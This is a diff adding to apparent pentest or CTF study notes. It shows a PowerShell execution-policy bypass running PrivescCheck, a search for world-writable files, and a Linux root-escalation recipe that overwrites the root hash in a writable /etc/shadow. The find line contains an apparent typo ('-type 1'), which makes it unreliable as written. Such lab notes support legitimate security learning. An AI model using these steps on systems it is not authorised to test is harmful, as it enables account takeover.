@@ -699,3 +699,19 @@ What PowerShell command can be used to bypass the default execution policy when 
 -------------------------------------------------------------------------------------------------------------------------------------------
 C:\> powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
 __________________________________________________________________________________________________________________________________
+Linux command can be used to identify files with the write permission applied for all user accounts
+-----------------------------------------------------------------------------------------------------
+#find / -not -type 1 -perm -o+w
+
+#/etc/shadow (all user can write)
+
+#openssl passwd -1 -salt abc password
+#nano /etc/shadow
+Paste that in root user password > gain root access
+__________________________________________________________________________________________________________________________________
+
+
+
+
+
+__________________________________________________________________________________________________________________________________
